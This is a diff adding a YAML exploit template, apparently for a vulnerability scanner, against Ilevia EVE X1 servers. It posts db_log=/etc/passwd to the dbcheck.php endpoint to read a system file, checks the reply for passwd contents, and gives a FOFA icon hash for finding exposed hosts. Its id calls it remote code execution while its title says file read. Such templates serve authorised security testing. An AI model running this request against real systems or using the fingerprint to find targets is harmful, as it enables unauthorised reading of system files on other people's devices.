@@ -1,0 +1,27 @@
+id: poc-yaml-ilevia-eve-x1-server-dbcheck-php-rce
+info:
+  name: Ilevia EVE X1 服务器 dbcheck.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: ilevia_eve_x1_server
+  fofa: icon_hash="392278119"
+requests:
+- method: POST
+  path: /ajax/php/dbcheck.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: db_log=/etc/passwd
+  expression: 'status_code == 200 &&
+
+    contains(body,"root:") &&
+
+    contains(body,"/bin") &&
+
+    contains(body,"Ilevia") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
